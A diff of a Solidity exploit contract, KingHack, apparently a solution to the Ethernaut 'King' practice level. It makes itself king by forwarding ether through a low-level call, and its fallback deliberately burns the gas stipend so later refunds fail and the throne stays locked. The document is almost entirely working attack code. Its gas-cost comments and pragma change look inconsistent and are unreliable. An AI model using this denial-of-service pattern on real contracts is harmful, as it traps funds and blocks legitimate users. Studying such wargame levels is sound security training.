@@ -1,29 +1,24 @@
-pragma solidity ^0.4.24;
+pragma solidity ^0.4.18;
 
 import "zeppelin/contracts/ownership/Ownable.sol";
 import "levels/King.sol";
 
 contract KingHack {
-    address public level;
     address public mywallet;
-    King    public target;
-
-    event log(uint256 indexed val);
+    event log(uint256 val);
     
-    constructor(address _inst) public {
-        target = King(_inst);
-    }
+    constructor() public {}
     
-    function attack() public {
-        target.transfer(1);
+    function attack(address _instance) public payable {
+        _instance.call.value(msg.value).gas(gasleft())();
         mywallet = msg.sender;
     }
 
-    function () public payable {
-        mywallet.transfer(msg.value);
-        
-        // waste gasleft
-        for(uint i = 0; i < 1000; i++)
-            emit log(i);
+    function () public payable {   
+        // waste stipend gasleft of 3321 gas
+        // each emit gasleft() cost 1066 gas
+        emit log(gasleft()); 
+        emit log(gasleft()); 
+        emit log(gasleft());
     }
 }
